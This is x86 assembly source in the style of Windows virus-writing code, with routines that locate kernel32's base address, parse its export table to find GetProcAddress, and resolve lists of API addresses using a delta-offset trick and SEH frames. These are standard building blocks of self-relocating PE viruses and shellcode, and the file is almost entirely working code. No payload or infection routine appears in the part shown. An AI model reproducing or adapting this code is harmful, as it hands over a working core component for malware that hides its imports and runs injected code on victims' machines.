   ;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
   ;Û Locate Kernel32 base address                       Û
   ;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
   ;
   ; Entry:  EAX = dword on stack at startup
   ;     EDX = pointer to kernel32 name
   ;
   ; Return: EAX = base address of kernel32 if success
   ;     EAX = 0, CF set if fail

   LocateKernel32 proc near
          pushad                      ; save all registers
          call @800                   ; ...I don't know why I
   @800:  pop ebx                     ; had to do this this way,
          add ebx, delta3-@800+1              ; but it wouldn't work
          mov dword ptr [ebx], ebp            ; otherwise...
                              ;
          lea ebx, [ebp+try_method_2_error]       ; first set up a seh
          push ebx                    ; frame so that if our
          push dword ptr fs:[0]               ; first method crashes
          mov fs:[0], esp                 ; we will find ourselves
                              ; in the second method
   locateloop:                    ;
          cmp dword ptr [eax+0b4h], eax           ; first method looks for
          je found_k32_kill_seh               ; the k32 by checking for
          dec eax                     ; the equal dword at 0b4
          cmp eax, 40000000h              ;
          jbe try_method_2                ;
          jmp locateloop                  ;
                              ;
   found_k32_kill_seh:                ; if we found it, then we
          pop dword ptr fs:[0]            ; must destroy the temp
          add esp, 4                  ; seh frame
          mov [ebp+@900], eax             ; save k32 base
          jmp found_k32                   ;
                              ;
   try_method_2_error:                ; if the first method gave
       mov esp, [esp+8]               ; and exception error we
   delta3: mov ebp, 12345678h             ; restore the stack and
                              ; the delta handle
   try_method_2:                      ;
          pop dword ptr fs:[0]            ; restore the seh state
          add esp, 4                  ;
          popad                       ; restore registers and
          pushad                      ; save them again
                              ; and go on w/ method two
          mov ebx, dword ptr [ebp+imagebase]      ; now put imagebase in ebx
          mov esi, ebx                ;
          cmp word ptr [esi], 'ZM'            ; check if it is an EXE
          jne notfound_k32                ;
          mov esi, dword ptr [esi.MZ_lfanew]      ; get pointer to PE
          cmp esi, 1000h                  ; too far away?
          jae notfound_k32                ;
          add esi, ebx                ;
          cmp word ptr [esi], 'EP'            ; is it a PE?
          jne notfound_k32                ;
          add esi, IMAGE_FILE_HEADER_SIZE         ; skip header
          mov edi, dword ptr [esi.OH_DataDirectory.DE_Import.DD_VirtualAddress]
          add edi, ebx                ; and get import RVA
          mov ecx, dword ptr [esi.OH_DataDirectory.DE_Import.DD_Size]
          add ecx, edi                ; and import size
          mov eax, edi                ; save RVA
                              ;
   locateloop2:                       ;
          mov edi, dword ptr [edi.ID_Name]        ; get the name
          add edi, ebx                ;
          cmp dword ptr [edi], 'NREK'         ; and compare to KERN
          je found_the_kernel_import          ; if it is not that one
          add eax, IMAGE_IMPORT_DESCRIPTOR_SIZE       ; skip to the next desc.
          mov edi, eax                ;
          cmp edi, ecx                ; but not beyond the size
          jae notfound_k32                ; of the descriptor
          jmp locateloop2                 ;
                              ;
   found_the_kernel_import:               ; if we found the kernel
          mov edi, eax                ; import descriptor
          mov esi, dword ptr [edi.ID_FirstThunk]      ; take the pointer to
          add esi, ebx                ; addresses
          mov edi, dword ptr [edi.ID_Characteristics] ; and the pointer to
          add edi, ebx                ; names
                              ;
   gha_locate_loop:                   ;
          push edi                    ; save pointer to names
          mov edi, dword ptr [edi.TD_AddressOfData]   ; go to the actual thunk
          add edi, ebx                ;
          add edi, 2                  ; and skip the hint
                              ;
          push edi esi                ; save these
          lea esi, dword ptr [ebp+getmodulehandle]    ; and point the name of
          mov ecx, getmodulehandlelen         ; GetModuleHandleA
          rep cmpsb                   ; see if it is that one
          je found_getmodulehandle            ; if so...
          pop esi edi                 ; otherwise restore
                              ;
          pop edi                     ; restore arrays indexes
          add edi, 4                  ; and skip to next
          add esi, 4                  ;
          cmp dword ptr [esi], 0              ; 0? -> end of import
          je notfound_k32                 ;
          jmp gha_locate_loop             ;
                              ;
   found_getmodulehandle:                 ;
          pop esi                     ; restore stack
          pop edi                     ;
          pop edi                     ;
                              ;
          push edx                    ; push kernel32 name
          mov esi, [esi]                  ; esi = GetModuleHandleA
          call esi                    ; address...
          mov [ebp+@900], eax             ; hold k32 base!!
          or eax, eax                 ;
          jz notfound_k32                 ;
                              ;
   found_k32:                     ;
          popad                       ; restore all regs and
          mov eax, [ebp+@900]             ; put k32 in EAX
          clc                     ; and mark success
          ret                     ;
                              ;
   notfound_k32:                      ;
          popad                       ; restore all regs
          xor eax, eax                ; and mark the failure...
          stc                     ;
          ret                     ;
   LocateKernel32 endp                ;
   @900 dd 0

   ;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
   ;Û Locate GetProcAddress                          Û
   ;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
   ;
   ; Entry:  EAX = base of kernel32
   ;     EDX = pointer to GetProcAddress name
   ;
   ; Return: EAX = address of GetProcAddress if success
   ;     EAX = 0, CF set if fail

   LocateGetProcAddress proc near             ;
          pushad                      ;
          mov ebx, eax                ; save the kernel base
          mov edi, eax                ;
          cmp word ptr [edi], 'ZM'            ; is it an exe?
          jne notfoundgpa                 ;
                              ;
          mov edi, dword ptr [edi.MZ_lfanew]      ;
          cmp edi, 1000h                  ;
          jae notfoundgpa                 ;
                              ;
          add edi, ebx                ;
          cmp word ptr [edi], 'EP'            ; is it a PE?
          jne notfoundgpa                 ;
                              ;
          add edi, IMAGE_FILE_HEADER_SIZE         ; skip file header
                              ;
          mov edi, dword ptr [edi.OH_DataDirectory.DE_Export.DD_VirtualAddress]
          add edi, ebx                ; and get export RVA
                              ;
          mov ecx, dword ptr [edi.ED_NumberOfNames]   ; save number of names
                              ; to look into
          mov esi, dword ptr [edi.ED_AddressOfNames]  ; get address of names
          add esi, ebx                ; align to base rva
                              ;
          push edi                    ; save pointer to export
                              ;
   gpa_locate_loop:                   ;
          mov edi, [esi]                  ; get one name address
          add edi, ebx                ; and align it
                              ;
          push ecx esi                ; save counter and addr.
                              ;
          mov esi, edx                ; compare to GetProcAddress
          mov ecx, getprocaddresslen          ;
          rep cmpsb                   ;
          je foundgpa                 ;
                              ;
          pop esi ecx                 ; restore them
                              ;
          add esi, 4                  ; and get next name
          loop gpa_locate_loop            ;
                              ;
   notfoundgpa:                       ; we didn't find it...
          pop edi                     ;
          popad                       ;
          xor eax, eax                ; mark failure
          stc                     ;
          ret                     ;
                              ;
   foundgpa:                      ;
          pop esi ecx                 ; ecx = how many did we
          pop edi                     ; check from total, but
          sub ecx, dword ptr [edi.ED_NumberOfNames]   ; we need the reminder
          neg ecx                     ; of the search
          mov eax, dword ptr [edi.ED_AddressOfOrdinals]; get address of ordinals
          add eax, ebx                ;
          shl ecx, 1                  ; and look using the index
          add eax, ecx                ;
          xor ecx, ecx                ;
          mov cx, word ptr [eax]              ; take the ordinal
          mov eax, dword ptr [edi.ED_AddressOfFunctions]; take address of funcs.
          add eax, ebx                ;
          shl ecx, 2                  ; we look in a dword array
          add eax, ecx                ; go to the function addr
          mov eax, [eax]                  ; take it's address
          add eax, ebx                ; and align it to k32 base
          mov [ebp+@901], eax             ; save it
          popad                       ; restore all regs
          mov eax, [ebp+@901]             ; and mark success
          clc                     ;
          ret                     ;
   LocateGetProcAddress endp              ;
   @901 dd 0

   ;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
   ;Û General module handle retriving routine                Û
   ;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
   ;
   ; Entry:  EDI = pointer to module name
   ;
   ; Return: EAX = module base address if success
   ;     EAX = 0, CF set if fail

   LocateModuleBase proc near             ;
          pushad                      ; save regs
          push edi                    ; push name
          call dword ptr [ebp+_GetModuleHandleA]      ; call GetModuleHandleA
          mov [ebp+@902], eax             ;
          popad                       ;
          mov eax, [ebp+@902]             ;
          or eax, eax                 ;
          jz notfoundmodule               ;
          clc                     ; success
          ret                     ;
                              ;
   notfoundmodule:                    ;
          stc                     ; fail
          ret                     ;
   LocateModuleBase endp                  ;
   @902 dd 0

   ;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
   ;Û General API address retriving routine                  Û
   ;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
   ;
   ; Entry:  EAX = base address of the module
   ;     EBX = address of GetProcAddress
   ;     EDI = pointer to api names list (each item null terminated,
   ;                      list terminated with 0FFh)
   ;     ESI = pointer to api addresses list
   ;
   ; Return: CF clear if success and list at ESI filled with API addresses
   ;     CF set if fail

   LocateApiAddresses proc near               ;
          pushad                      ; save all regs
          mov edx, eax                ; save module base
   locate_apis_loop:                  ;
          cmp byte ptr [edi], 0FFh            ; is it the end?
          je ready_apis                   ;
                              ;
          push edx                    ; save base
          push edi                    ; push api name
          push edx                    ; push module base
          call ebx                    ; call GetProcAddress
          pop edx                     ; restore module base
          or eax, eax                 ; error?
          je error_finding_apis               ;
                              ;
          mov dword ptr [esi], eax            ; save api address
                              ;
          mov ecx, 100h                   ; look for the next
          mov al, 0                   ; api name
          repnz scasb                 ;
                              ;
          add esi, 4                  ; increment array
          jmp locate_apis_loop            ;
                              ;
   ready_apis:                    ;
          popad                       ; all ok!
          clc                     ;
          ret                     ;
                              ;
   error_finding_apis:                ;
          popad                       ; error here...
          stc                     ;
          ret                     ;
   LocateApiAddresses endp                ;
